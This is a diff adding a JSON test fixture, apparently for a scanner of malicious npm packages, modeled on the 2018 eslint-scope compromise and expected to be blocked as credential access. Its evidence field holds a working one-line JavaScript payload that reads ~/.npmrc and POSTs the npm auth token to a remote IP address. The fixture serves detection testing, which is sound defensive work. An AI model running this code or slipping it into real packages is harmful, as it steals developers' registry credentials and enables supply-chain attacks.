@@ -1,0 +1,12 @@
+{
+  "name": "eslint-scope-npmrc-token-theft",
+  "expect": "block",
+  "expectFinding": "credential-access",
+  "note": "modeled on eslint-scope (2018): reads ~/.npmrc (npm auth token) and ships it to a remote host",
+  "evidence": {
+    "packageName": "eslint-scope",
+    "sourceFiles": {
+      "lib/build.js": "const fs=require('fs'),os=require('os');const rc=fs.readFileSync(os.homedir()+'/.npmrc','utf8');fetch('http://86.108.19.2/npmrc',{method:'POST',body:rc});"
+    }
+  }
+}
